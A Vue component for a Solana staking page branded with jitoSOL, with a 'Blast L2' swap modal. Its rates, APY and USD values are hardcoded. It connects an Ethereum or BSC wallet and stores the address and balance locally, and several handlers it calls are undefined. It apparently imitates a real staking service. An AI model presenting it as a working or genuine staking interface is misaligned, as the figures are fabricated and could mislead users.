<template>
  <div class="ynewstake">
    <div class="ynewstabox flex jus">
      <div class="ynewstableft">
        <h2>MEV Powered <br />Staking Rewards.</h2>
        <p>Choose how much you want to stake and earn rewards.</p>
        <div class="ynewstaketxtb flex flexcol">
          <div class="ynewstakex"></div>
          <div class="ynewstaket">Earn MEV Enhanced Rewards</div>
          <span class="ynewstakethr">Connect your wallet to start earning</span>
          <div class="ynewstakebut">
            <button
              :class="butshow == '0' ? 'ynewstakebutshow' : 'ynewstakebutnone'"
              @click="render()"
            >
              Connect Wallet
            </button>
            <button
              :class="butshow == '1' ? 'ynewstakebutshow' : 'ynewstakebutnone'"
            >
              Connected
            </button>
          </div>
        </div>
      </div>
      <div class="ynewstabright">
        <div class="ynewstabrbox flex flexcol">
          <h1>Stake Solana</h1>
          <p>Choose how much you want to stake and earn rewards</p>
          <div class="ynewstabtabflex flex">
            <button
              @click="changetab('0')"
              :class="staktab == '0' ? 'ynewstabtabfshow' : ''"
            >
              <div class="flex ynewstathry">
                Stake
                <div class="ynewstayr">≈ 6.96% APY</div>
              </div>
            </button>
            <button
              @click="changetab('1')"
              :class="staktab == '1' ? 'ynewstabtabfshow' : ''"
            >
              <div class="flex ynewstathry">Unstake</div>
            </button>
          </div>
          <div :class="staktab == '0' ? 'ynewstaybox' : 'ynewstayboxnone'">
            <div class="ynewstayboxc">
              <div class="ynewstayboxcy flex jus">
                <div class="ynewstayboxcyl">You're staking</div>
                <div class="ynewstayboxcyr flex jus">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke-width="1.5"
                    stroke="currentColor"
                    aria-hidden="true"
                    class="w-3 h-3"
                  >
                    <path
                      stroke-linecap="round"
                      stroke-linejoin="round"
                      d="M21 12a2.25 2.25 0 00-2.25-2.25H15a3 3 0 11-6 0H5.25A2.25 2.25 0 003 12m18 0v6a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 18v-6m18 0V9M3 12V9m18 0a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 9m18 0V6a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 6v3"
                    ></path>
                  </svg>
                  <span>0</span>
                </div>
              </div>
              <div class="ynewstayboxct flex jus">
                <div class="ynewstayboxctl">
                  <button class="ynewstayboxctlbox flex jus">
                    <img src="../assets/SOL.png" alt="" />
                    <div>SOL</div>
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 20 20"
                      fill="currentColor"
                      aria-hidden="true"
                      class="hover:text-gray-400 dark:hover:text-zinc-300 mr-2 h-5 w-5"
                    >
                      <path
                        fill-rule="evenodd"
                        d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
                        clip-rule="evenodd"
                      ></path>
                    </svg>
                  </button>
                  <div class="ynewstayboxctlshow">
                    <div class="ynewstayboxctlshowy flex jus">
                      <button
                        @click="changetctab('0')"
                        :class="tctab == '0' ? 'ynewstayboxctlshowactive' : ''"
                      >
                        Tokens
                      </button>
                      <button
                        @click="changetctab('1')"
                        :class="tctab == '1' ? 'ynewstayboxctlshowactive' : ''"
                      >
                        Stake
                      </button>
                    </div>
                    <div
                      :class="
                        tctab == '0'
                          ? 'ynewstayboxctlshowt flex jus'
                          : 'ynewstayboxctlshowtnone'
                      "
                      style="margin-top: 1rem"
                    >
                      <img src="../assets/SOL.png" alt="" />
                      <div class="ynewstayboxctlshowtbox">
                        <div class="ynewstayboxctlshowty flex jus">
                          <p>SOL</p>
                          <span>0.00</span>
                        </div>
                        <div class="ynewstayboxctlshowtt flex">So11...1112</div>
                      </div>
                    </div>
                    <div
                      :class="
                        tctab == '1'
                          ? 'ynewstayboxctlshowcont'
                          : 'ynewstayboxctlshowtnone'
                      "
                    >
                      (No stake accounts found)
                    </div>
                  </div>
                </div>
                <div class="ynewstayboxctr">
                  <input
                    @input="inpshu()"
                    v-model="inpvalsta"
                    type="text"
                    placeholder="0.0"
                  />
                  <span>{{ balance }}</span>
                </div>
              </div>
              <div class="ynewstayboxcy flex jus" style="margin: 1.5rem 0 0">
                <div class="ynewstayboxcyl">To receive</div>
                <div class="ynewstayboxcyr flex jus">
                  <span>0% Slippage</span>
                </div>
              </div>
              <div class="ynewstayboxct flex jus" style="margin: 0 0 0.75rem">
                <div class="ynewstayboxctl">
                  <button
                    class="ynewstayboxctlbox flex jus"
                    style="padding: 0.75rem"
                  >
                    <img src="../assets/jito_sol.svg" alt="" />
                    <div>jitoSOL</div>
                  </button>
                </div>
                <div class="ynewstayboxctr">
                  <div>{{ inpbalance }}</div>
                  <span>{{ balance }}</span>
                </div>
              </div>
              <div class="ynewstayboxcthr">
                <button
                  :class="
                    butshow == '0' ? 'ynewstakebutshow' : 'ynewstakebutnone'
                  "
                  @click="render()"
                >
                  Connect Wallet
                </button>
                <button
                  :class="
                    butshow == '1' ? 'ynewstakebutshow' : 'ynewstakebutnone'
                  "
                >
                  Connected
                </button>
              </div>
              <div class="ynewstayboxfour">
                <div class="ynewstayboxfoury flex jus" style="margin: 1rem 0">
                  <span>1 JitoSOL</span>
                  <span>≈1.0751518284911992 SOL</span>
                </div>
                <div class="ynewstayboxfoury flex jus">
                  <span>Network fee</span> <span>0.000015 SOL</span>
                </div>
              </div>
            </div>
          </div>
          <div :class="staktab == '1' ? 'ynewstayboxt' : 'ynewstayboxnone'">
            <div class="ynewstayboxty flex">
              <img src="../assets/jito_sol.svg" alt="" />
              <div>JitoSOL</div>
            </div>
            <div class="ynewstayboxtt">
              <input
                @input="inpsshu()"
                v-model="inpvval"
                type="text"
                placeholder="0.0"
                name=""
                id=""
              />
            </div>
            <div class="ynewstayboxtthr flex">
              <span>Balance: 0 JitoSOL</span>
            </div>
            <div class="ynewstayboxtfour flex flexcol">
              <div
                @click="changetxt('0')"
                :class="
                  qhtxt == '0'
                    ? 'ynewstayboxtfoury ynewstayboxtfourshow'
                    : 'ynewstayboxtfoury'
                "
              >
                <div class="ynewstayboxtfourytop flex jus">
                  <span>Sell JitoSOL for SOL via Jupiter</span>
                  <div>0.1% Slippage</div>
                </div>
                <div class="ynewstayboxtfourybot">{{ solbalance }} SOL</div>
              </div>
              <div
                @click="changetxt('1')"
                :class="
                  qhtxt == '1'
                    ? 'ynewstayboxtfoury ynewstayboxtfourshow'
                    : 'ynewstayboxtfoury'
                "
              >
                <div class="ynewstayboxtfourytop flex jus">
                  <span>Unstake in 2 Days</span>
                </div>
                <div class="ynewstayboxtfourybot">{{ solbalancet }} SOL</div>
              </div>
            </div>
            <div class="ynewstayboxtfive">
              <button>Unstake SOL</button>
            </div>
            <div class="ynewstayboxfour">
              <div class="ynewstayboxfoury flex jus" style="margin: 1rem 0px">
                <span>1 JitoSOL</span><span>≈1.075 SOL</span>
              </div>
              <div class="ynewstayboxfoury flex jus" style="margin: 1rem 0px">
                <span>Network fee</span>
                <span>0.000015 SOL</span>
              </div>
              <div class="ynewstayboxfoury flex jus">
                <span>Enough SOL for unstake fees</span>
                <span>No</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div @click.stop="jhbjz()" class="yarijhbms">
      <h1>
        {{ $store.state.txt.yaridropswaptitley }}<br />{{
          $store.state.txt.yaridropswaptitlet
        }}
      </h1>
      <p>
        {{ $store.state.txt.yaridropswaptxty }}<br />
        {{ $store.state.txt.yaridropswaptxtt }}<br />
        {{ $store.state.txt.yaridropswaptxtthr }}
      </p>
      <p>
        {{ $store.state.txt.yaridropswapttxty }}<br />
        {{ $store.state.txt.yaridropswapttxtt }}
      </p>
      <span
        >{{ $store.state.txt.yaridropswappy }}<br />
        {{ $store.state.txt.yaridropswappt }}</span
      >
    </div>
    <div @click.stop="jhbjz()" class="yarijhbbox">
      <img @click="jydaib('0')" src="../assets/close-line.svg" alt="" />
      <div class="yarijhboxtop">
        <div class="yarijhbty flex jus">
          <div class="yarijhboxy"></div>
          <div class="yarijhboxtwo">{{ $store.state.txt.yaridropswapry }}</div>
          <div class="yarijhboxthr"></div>
        </div>
        <div class="yarijhbtt flex">
          <span>{{ dqyue == 0 ? "0.00" : parseFloat(dqyue).toFixed(5) }}</span>
          <div><img src="../assets/eth-color.svg" alt="" /></div>
        </div>
      </div>
      <div class="yarijhboxttwo">
        <div class="yarijhbtty flex jus">
          <div class="yarijhbttyy"></div>
          <div class="yarijhbttyt">{{ $store.state.txt.yaridropswaprt }}</div>
          <div class="yarijhbttythr"></div>
        </div>
        <div class="yarijhbttthr flex">
          <div class="yarijhbttthrimg">
            <img src="../assets/eth-color.svg" alt="" />
          </div>
          <span>{{ $store.state.txt.yaridropswaprthr }}</span>
        </div>
        <div class="yarijhbttf flex">
          <input
            type="text"
            v-model="inpvalsta"
            @input="isnum()"
            placeholder="0.0"
          />
          <div class="yarijhbttft flex">
            <div @click="dblistbox('1')" class="yarijhbttftbox flex">
              <div><img :src="showbimg" alt="" /></div>
              <span>{{ showb }}</span>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 24 24"
                width="24"
                height="24"
              >
                <path
                  d="M11.9997 13.1714L16.9495 8.22168L18.3637 9.63589L11.9997 15.9999L5.63574 9.63589L7.04996 8.22168L11.9997 13.1714Z"
                  fill="rgba(255,255,3,1)"
                ></path>
              </svg>
            </div>
            <div
              :class="
                dblistshow == '1' ? 'yarijhbttflist' : 'yarijhbttflistnone'
              "
            >
              <div
                v-for="(item, index) in showbslist"
                :key="index"
                class="yarijhbttfliy flex jus"
                @click="choosedb(item)"
              >
                <div class="yarijhbttfliyleft flex">
                  <div class="yarijhbttfliylefty">
                    <img :src="item.img" alt="" />
                  </div>
                  <span>{{ item.daibname }}</span>
                </div>
                <span>{{ item.price }}</span>
              </div>
            </div>
          </div>
        </div>
        <div class="yarijhbttw flex">
          <div class="yarijhbttwy flex">
            <span style="color: rgb(169, 169, 169)">{{
              $store.state.txt.yaridropswaprf
            }}</span>
            <span style="color: rgb(235, 235, 235)">{{
              dqyue == 0 ? "0.00" : parseFloat(dqyue).toFixed(5)
            }}</span>
          </div>
          <div class="yarijhbttwt" @click="maxdbye()">MAX</div>
        </div>
        <div class="yarijhbtts flex jus">
          <div style="width: 45%" class="yarijhbttyy"></div>
          <div class="yarijhbttyt">TO</div>
          <div style="width: 45%" class="yarijhbttythr"></div>
        </div>
        <div class="yarijhbttthr flex">
          <div class="yarijhbttthrimg">
            <img src="../assets/slogos.png" alt="" />
          </div>
          <span>Blast L2</span>
        </div>
        <div class="yarjhbttq">
          {{ $store.state.txt.yaridropswaprwy }}
          {{
            inpvalsta == "" || inpvalsta == 0
              ? "0.00"
              : parseFloat(inpvalsta).toFixed(5)
          }}
          {{ $store.state.txt.yaridropswaprwt }}
        </div>
      </div>
      <div class="yarijhbend">
        <button
          @click="render()"
          :class="xethbalance == '' ? 'yarijhbendbut' : 'yarijhbendbutnone'"
        >
          Connecct Wallet
        </button>
        <button
          :class="
            inpvalsta == '' && xethbalance != ''
              ? 'yarijhbendbutjz'
              : 'yarijhbendbutnone'
          "
        >
          {{ $store.state.txt.yaridropsubmit }}
        </button>
        <button
          @click="fwc()"
          :class="
            inpvalsta != '' && xethbalance != ''
              ? 'yarijhbendbut'
              : 'yarijhbendbutnone'
          "
        >
          {{ $store.state.txt.yaridropsubmit }}
        </button>
        <img src="../assets/usdc-color.svg" alt="" />
        <img src="../assets/tether-color.svg" alt="" />
        <img src="../assets/steth-color.svg" alt="" />
        <img src="../assets/dai-color.svg" alt="" />
        <img src="../assets/weth-color.svg" alt="" />
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted } from "vue";
import { ethers } from "ethers";
import Web3Modal from "web3modal";
import bus from "../utils/bus";
let butshow = ref("0");
let staktab = ref("0");
let tctab = ref("0");
let tcshow = ref("0");
const xhladdress = ref("");
const xxhladdress = ref("");
const xethbalance = ref("");
let balance = ref("");
let inpvalsta = ref("");
let inpvval = ref("");
let solbalance = ref("0.0");
let solbalancet = ref("0.0");
let qhtxt = ref("0");
let inpbalance = ref("0");
let web3Modal = {};
onMounted(() => {
  bus.$on("qbbalance", (val) => {
    if (val != "" && val != "0.00") {
      butshow.value = "1";
    } else if (val == "0.00") {
      butshow.value = "0";
    }
  });
  if (localStorage.getItem("xhlbalance")) {
    butshow.value = "1";
  }
});
const connect = async () => {
  const WalletConnect = window.WalletConnectProvider.default;
  const Fortmatic = window.Fortmatic;
  const providerOptions = {
    fortmatic: {
      package: Fortmatic,
      options: {
        // Mikko's TESTNET api key
        key: "pk_test_391E26A3B43A3350",
      },
    },
    walletconnect: {
      package: WalletConnect,
      options: {
        rpc: {
          56: "https://bsc-dataseed.binance.org/",
          97: "https://data-seed-prebsc-1-s1.binance.org:8545/",
        },
        network: "binance",
      },
    },
  };

  web3Modal = new Web3Modal({
    network: "mainnet", // optional
    cacheProvider: true, // optional
    providerOptions, // required
  });
  const externalProvider = await web3Modal.connect();
  return new ethers.providers.Web3Provider(externalProvider);
};
const render = async () => {
  const provider = await connect();
  const signer = provider.getSigner(0);
  xhladdress.value = await signer.getAddress();
  xxhladdress.value =
    xhladdress.value.substring(0, 4) +
    "..." +
    xhladdress.value.substring(
      xhladdress.value.length - 4,
      xhladdress.value.length
    );
  butshow.value = "1";
  localStorage.setItem("xhladd", xhladdress.value);
  const rawBalance = await provider.getBalance(xhladdress.value);
  xethbalance.value = ethers.utils.formatEther(rawBalance);
  localStorage.setItem("xhlbalance", xethbalance.value);
  bus.$emit("qbbalance", xethbalance.value);
};
let changetctab = (str) => {
  tctab.value = str;
};
let changetxt = (str) => {
  qhtxt.value = str;
};
let changetab = (str) => {
  staktab.value = str;
};
let inpshu = () => {
  inpvalsta.value = inpvalsta.value.replace(/[^\d.]/g, "");
  if (inpvalsta.value == "") {
    balance.value = ``;
    inpbalance.value = "0";
  } else {
    balance.value = `US$${parseFloat(inpvalsta.value) * 73.47}`;
    inpbalance.value = `${parseFloat(inpvalsta.value) * 0.9301}`;
  }
};
let inpsshu = () => {
  inpvval.value = inpvval.value.replace(/[^\d.]/g, "");
  if (inpvval.value == "") {
    solbalance.value = "0.0";
    solbalancet.value = "0.0";
  } else {
    solbalance.value = `${parseFloat(inpvval.value) * 1.073738939}`;
    solbalancet.value = `${parseFloat(inpvval.value) * 1.074076677}`;
  }
};
</script>

<style scoped>
.yarijhbms {
  width: 40%;
}
.yarijhbms > h1 {
  font-size: 3.5rem;
  line-height: 3rem;
  font-family: "Vectrex";
  font-weight: 600;
  color: white;
  line-height: 1.25;
}
.yarijhbms > p {
  font-size: 24px;
  color: rgb(235, 235, 235);
  text-align: left;
  margin: 2rem 0 0;
  font-family: "Inter";
}
.yarijhbms > span {
  display: block;
  font-size: 0.875rem;
  color: rgb(169, 169, 169);
  text-align: left;
  margin: 8rem 0 0;
  font-family: "Inter";
}
.yarijhbbox {
  width: 30%;
  padding: 1.5rem;
  box-sizing: border-box;
  background: rgb(36 35 37);
  position: relative;
}
.yarijhbbox > img {
  width: 1.5rem;
  position: absolute;
  top: 0.75rem;
  right: 0.75rem;
  cursor: pointer;
}
.yarijhboxtop {
  margin: 1rem 0 0.75rem;
}

.yarijhboxtwo {
  font-family: "Interl";
  padding: 0 0.5rem;
  font-size: 0.75rem;
  line-height: 160%;
  letter-spacing: 0;
  color: white;
}

.yarijhboxy {
  width: 35%;
  height: 1px;
  background: rgb(169, 169, 169);
}

.yarijhboxthr {
  width: 35%;
  height: 1px;
  background: rgb(169, 169, 169);
}
.yarijhbend {
  width: 100%;
  margin-top: 1rem;
}
.yarijhbend > img {
  display: none;
}
.yarijhbend .yarijhbendbut {
  display: block;
  width: 100%;
  padding: 0.5rem 1rem;
  font-family: "Vectrex";
  text-align: center;
  background: transparent;
  border: 2px solid rgb(179 187 202);
  color: white;
  border-radius: 0.375rem;
  cursor: pointer;
}
.yarijhbend .yarijhbendbutjz {
  display: block;
  width: 100%;
  padding: 0.5rem 1rem;
  font-family: "Vectrex";
  text-align: center;
  background: transparent;
  border: 2px solid rgb(169, 169, 169);
  color: rgb(169, 169, 169);
  border-radius: 0.375rem;
  cursor: not-allowed;
}
.yarijhbend .yarijhbendbut:hover {
  border-color: white;
}
.yarijhbend .yarijhbendbutnone {
  display: none;
}
.ynewstake {
  padding: 10rem 0 4rem;
  width: 100%;
  background: rgb(17, 11, 11);
}
.ymainhy > .ynewstake {
  background: rgb(235, 235, 235);
}
.ynewstabox {
  max-width: 82rem;
  padding: 0 1rem;
  box-sizing: border-box;
  margin: 0 auto;
  align-items: center;
}
.ynewstableft {
  width: 53.75%;
  padding: 2.5rem 2rem 0;
  box-sizing: border-box;
}
.ynewstableft > h2 {
  font-size: 60px;
  font-family: "Vectrex";
  color: white;
}
.ynewstableft > p {
  font-family: "Interl";
  font-size: 1.375rem;
  margin: 1rem auto;
  color: #b3bbca;
}
.ynewstaketxtb {
  margin-top: 2rem;
  gap: 2rem;
}
.ynewstakex {
  width: 100%;
  border: 1px solid white;
  margin-bottom: 1rem;
}
.ynewstaket {
  font-family: "Vectrex";
  font-weight: 500;
  font-size: 2rem;
  line-height: 2.25rem;
  color: white;
}
.ymainhy .ynewstableft > h2 {
  color: black;
}
.ymainhy .ynewstableft > p {
  color: black;
}
.ymainhy .ynewstakex {
  border-color: black;
}
.ymainhy .ynewstaket {
  color: black;
}
.ynewstakethr {
  font-family: "Interl";
  font-size: 1rem;
  color: #b3bbca;
}
.ymainhy .ynewstakethr {
  color: black;
}
.ynewstakebut {
  margin-top: 0.5rem;
}
.ynewstakebutnone {
  display: none;
}
.ynewstakebut button {
  font-family: "Vectrex";
  width: 11.5rem;
  border: 2px solid rgb(179 187 202);
  border-radius: 0.375rem;
  height: 3rem;
  font-weight: 400;
  font-size: 1rem;
  background: transparent;
  cursor: pointer;
}
.ynewstakebutshow {
  color: rgb(255 255 255);
}
.ynewstakebutshow:hover {
  border-color: rgb(255 255 255);
}
.ymainhy .ynewstakebutshow {
  border-color: rgb(105 111 122);
  color: black;
}
.ymainhy .ynewstakebutshow:hover {
  border-color: rgb(17 11 11);
}
.ynewstabright {
  width: 41.40625%;
  padding: 1.75rem;
  box-shadow: 0 0 #0000, 0 0 #0000, 0 10px 15px -3px rgba(0, 0, 0, 0.1),
    0 4px 6px -4px rgba(0, 0, 0, 0.1);
  background: black;
  border: 1px solid #b3bbca;
  border-radius: 1.5rem;
  box-sizing: border-box;
  color: white;
}
.ynewstabrbox {
  gap: 1rem;
}
.ynewstabrbox > h1 {
  font-family: "Vectrex";
  font-size: 2.25rem;
  line-height: 2.5rem;
  text-align: center;
}
.ynewstabrbox > p {
  width: 100%;
  font-family: "Interl";
  padding: 0 3.5rem;
  font-size: 1.25rem;
  line-height: 1.75rem;
  box-sizing: border-box;
  color: #b3bbca;
  text-align: center;
}
.ynewstabtabflex {
  width: 80%;
  margin: 0 auto;
  background: rgb(48, 48, 48);
  border-radius: 999px;
}
.ynewstabtabflex > button {
  width: 45.5%;
  font-family: "Vectrex";
  font-size: 1rem;
  line-height: 1.5rem;
  transition-property: color, background-color, border-color,
    text-decoration-color, fill, stroke;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 0.15s;
  outline: 2px solid transparent;
  outline-offset: 2px;
  color: rgb(153 153 153);
  box-shadow: 0 0 #0000, 0 0 #0000, 0 1px 3px 0 rgba(0, 0, 0, 0.1),
    0 1px 2px -1px rgba(0, 0, 0, 0.1);
  padding: 0.5rem 0.25rem;
  background: transparent;
  margin: 0.5rem;
  border-radius: 9999px;
  box-sizing: border-box;
}
.ynewstabtabflex > .ynewstabtabfshow {
  color: white;
  background: rgb(17 11 11);
}
.ynewstathry {
  column-gap: 0.5rem;
  justify-content: center;
  align-items: center;
}
.ynewstayr {
  font-family: "Interl";
  font-size: 0.75rem;
  line-height: 1rem;
  color: white;
  padding: 0.25rem 0.625rem;
  background: rgb(108 179 83);
  border-radius: 999px;
}
.ynewstabtabflex > button:hover {
  background: rgb(30, 30, 30);
}
.ynewstaybox {
  margin-top: 3rem;
  display: block;
}
.ynewstayboxnone {
  display: none;
}
.ynewstayboxc {
  width: 100%;
  padding: 0 0.5rem;
  box-sizing: border-box;
}
.ynewstayboxcyl {
  font-family: "Interl";
  font-size: 0.75rem;
  line-height: 1rem;
  margin-bottom: 2px;
  color: #b3bbca;
}
.ynewstayboxcyr {
  font-family: "Interl";
  justify-content: flex-end;
  font-size: 0.75rem;
  line-height: 1rem;
  column-gap: 0.25rem;
  padding-right: 0.5rem;
  align-items: center;
  margin-bottom: 2px;
  color: #b3bbca;
  text-align: end;
}
.ynewstayboxcyr > svg {
  width: 0.75rem;
  height: 0.75rem;
}
.ynewstayboxct {
  width: 100%;
  padding: 0.5rem 0.75rem 0.5rem 0.5rem;
  box-sizing: border-box;
  border: 1px solid rgb(161 161 170);
  border-radius: 0.75rem;
  align-items: center;
  column-gap: 0.5rem;
}
.ynewstayboxctl {
  width: 7.5rem;
  font-size: 0.875rem;
  line-height: 1.25rem;
  color: white;
  border: 1px solid rgb(212 212 216);
  border-radius: 0.375rem;
  box-sizing: border-box;
  position: relative;
}
.ynewstayboxctlbox {
  font-family: "Vectrex";
  width: 100%;
  padding: 0.75rem 0 0.75rem 0.75rem;
  box-sizing: border-box;
  font-size: 0.875rem;
  line-height: 1.25rem;
  background: transparent;
  color: white;
}
.ynewstayboxctlbox > img {
  width: 1.3125rem;
  height: 1.3125rem;
  border-radius: 50%;
}
.ynewstayboxctlbox > svg {
  width: 1.25rem;
  height: 1.25rem;
  margin-right: 0.5rem;
}
.ynewstayboxctr {
  width: 66.228%;
}
.ynewstayboxctr > input {
  width: 100%;
  text-align: right;
  font-size: 1.875rem;
  line-height: 2.25rem;
  outline: 2px solid transparent;
  outline-offset: 2px;
  font-family: "Vectrex";
  background: transparent;
  border: none;
  color: white;
}
.ynewstayboxctr > div {
  width: 100%;
  text-align: right;
  font-size: 1.875rem;
  line-height: 2.25rem;
  outline: 2px solid transparent;
  outline-offset: 2px;
  font-family: "Vectrex";
  background: transparent;
  border: none;
  color: white;
}
.ynewstayboxctr > span {
  display: block;
  font-size: 11px;
  text-align: right;
  margin-top: -4px;
  color: #b3bbca;
}
.ynewstayboxcthr {
  width: 100%;
  margin-top: 2rem;
}
.ynewstayboxcthr > button {
  width: 100%;
  padding: 0.75rem 0.625rem;
  box-sizing: border-box;
  color: white !important;
  font-family: "Vectrex";
  font-size: 1rem;
  line-height: 1.5rem;
  background: transparent;
  border: 1px solid rgb(229, 231, 235) !important;
  border-radius: 999px;
  box-shadow: 0 0 #0000, 0 0 #0000, 0 1px 2px 0 rgba(0, 0, 0, 0.05);
}
.ynewstayboxfoury > span:nth-child(1) {
  font-size: 0.875rem;
  line-height: 1.25rem;
  color: #999999;
  font-family: "Interl";
}
.ynewstayboxfoury > span:nth-child(2) {
  font-size: 0.875rem;
  line-height: 1.25rem;
  color: white;
  font-family: "Interl";
}
.ynewstayboxctl:hover .ynewstayboxctlshow {
  display: block;
}
.ynewstayboxctlshow {
  display: none;
  position: absolute;
  width: 27.125rem;
  background: rgb(25, 25, 25);
  border: 1px solid rgb(161, 161, 170);
  padding: 0.75rem;
  z-index: 10;
  left: 0;
  border-radius: 0.375rem;
  top: 0;
  box-sizing: border-box;
}
.ynewstayboxctlshowy {
  padding: 0.25rem;
  background: rgb(48, 48, 48);
  border: 1px solid rgb(161, 161, 170);
  border-radius: 0.5rem;
}
.ynewstayboxctlshowy button {
  width: 48%;
  font-family: "Vectrex";
  outline: 2px solid transparent;
  outline-offset: 2px;
  transition-property: color, background-color, border-color,
    text-decoration-color, fill, stroke;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 0.15s;
  color: rgb(153 153 153);
  background: transparent;
  font-size: 0.875rem;
  padding: 0.375rem;
  line-height: 1.25rem;
  border-radius: 0.5rem;
}
.ynewstayboxctlshowy button:hover {
  background: rgb(30, 30, 30);
}
.ynewstayboxctlshowy > .ynewstayboxctlshowactive {
  color: white;
  background: rgb(17 11 11);
}
.ynewstayboxctlshowt {
  width: 100%;
  padding: 0.5rem 0.75rem;
  box-sizing: border-box;
  background: rgb(17 11 11);
  align-items: center;
  column-gap: 0.625rem;
}
.ynewstayboxctlshowt > img {
  width: 1.3125rem;
  border-radius: 50%;
}
.ynewstayboxctlshowtbox {
  width: 90%;
}
.ynewstayboxctlshowty {
  align-items: center;
}
.ynewstayboxctlshowty > p {
  font-family: "Vectrex";
  font-size: 0.875rem;
  line-height: 1.25rem;
}
.ynewstayboxctlshowty > span {
  font-family: "Interl";
  font-size: 0.75rem;
  line-height: 1rem;
  color: #a1a1aa;
}
.ynewstayboxctlshowtt {
  font-family: "Interl";
  font-size: 0.75rem;
  line-height: 1rem;
  color: #a1a1aa;
}
.ynewstayboxctlshowcont {
  padding: 2.5rem 0 0;
  display: block;
  text-align: center;
  font-family: "Interl";
  font-size: 0.75rem;
  line-height: 1rem;
  color: #a1a1aa;
}
.ynewstayboxctlshowtnone {
  display: none;
}
.ynewstayboxt {
  margin-top: 2rem;
  width: 100%;
}
.ynewstayboxty {
  align-items: center;
  justify-content: center;
  column-gap: 0.5rem;
}
.ynewstayboxty > img {
  width: 2.5rem;
  height: 2.5rem;
  border-radius: 50%;
}
.ynewstayboxty > div {
  font-family: "Vectrex";
  font-size: 1.5rem;
  line-height: 2rem;
  color: white;
}
.ynewstayboxtt {
  width: 100%;
  margin-top: 1rem;
}
.ynewstayboxtt > input {
  font-family: "Vectrex";
  display: block;
  width: 75%;
  border-radius: 9999px;
  margin: 0 auto;
  font-size: 3rem;
  line-height: 1;
  color: white;
  text-align: center;
  background: transparent;
  border: 1px solid transparent;
}
.ynewstayboxtt > input:focus {
  border: 1px solid white;
}
.ynewstayboxtthr {
  justify-content: center;
  margin: 1rem 0;
}
.ynewstayboxtthr > span {
  display: block;
  border-radius: 999px;
  font-family: "Vectrex";
  font-size: 1rem;
  line-height: 1.5rem;
  padding: 0.5rem 0.75rem;
  border: 1px solid rgb(161 161 170);
}
.ynewstayboxtfour {
  margin: 2rem 0 1.25rem;
  column-gap: 0.5rem;
}
.ynewstayboxtfoury {
  width: 100%;
  cursor: pointer;
  margin-top: 0.5rem;
  padding: 0.5rem 1rem;
  border: 1px solid #b3bbca;
  border-radius: 0.5rem;
  box-sizing: border-box;
  box-shadow: 0 0 #0000, 0 0 #0000, 0 1px 2px 0 rgba(0, 0, 0, 0.05);
}
.ynewstayboxtfourytop > span {
  font-family: "Vectrex";
  color: white;
  font-size: 0.875rem;
  line-height: 1.25rem;
}
.ynewstayboxtfourytop > div {
  font-family: "Vectrex";
  font-size: 0.75rem;
  line-height: 1rem;
  color: rgb(161 161 170);
}
.ynewstayboxtfourybot {
  font-family: "Vectrex";
  margin-top: 0.25rem;
  font-size: 0.875rem;
  line-height: 1.25rem;
  color: rgb(200 200 200);
}
.ynewstayboxtfourshow {
  background: rgb(48, 48, 48);
}
.ynewstayboxtfive {
  width: 100%;
  margin: 1rem 0;
}
.ynewstayboxtfive > button {
  width: 100%;
  padding: 0.75rem 0.625rem;
  box-sizing: border-box;
  color: white;
  font-family: "Vectrex";
  font-size: 1rem;
  line-height: 1.5rem;
  background: transparent;
  border: 1px solid rgb(229, 231, 235);
  border-radius: 999px;
  box-shadow: 0 0 #0000, 0 0 #0000, 0 1px 2px 0 rgba(0, 0, 0, 0.05);
}
@media (max-width: 1250px) {
  .ynewstabox {
    width: 95%;
    padding: 0;
    display: block;
  }
  .ynewstableft {
    width: 100%;
    padding: 1rem;
  }
  .ynewstaketxtb {
    gap: 0.5rem;
    margin-top: 0.5rem;
  }
  .ynewstabright {
    width: 100%;
    margin: 2rem 0;
    padding: 1.75rem 0.75rem;
  }
  .ynewstabrbox > p {
    padding: 0 1rem;
  }
  .ynewstabtabflex {
    width: 100%;
    justify-content: center;
  }
  .ynewstayr {
    padding: 0.25rem;
    font-size: 0.65rem;
  }
  .ynewstaybox {
    margin-top: 1rem;
  }
  .ynewstayboxt {
    margin-top: 1rem;
  }
  .ynewstayboxtfourytop > span {
    font-size: 0.75rem;
  }
  .ynewstayboxtfoury {
    padding: 0.5rem;
  }
  .ynewstake {
    padding: 8rem 0 2rem;
  }
  .ynewstableft > h2 {
    font-size: 2.75rem;
  }
  .ynewstableft > p {
    font-size: 1.125rem;
    margin: 0.5rem 0;
  }
  .ynewstaket {
    font-size: 1.75rem;
  }
  .ynewstayboxctlshow {
    width: 19.125rem;
  }
  .ynewstayboxctlbox {
    padding: 0.5rem !important;
  }
}
</style>
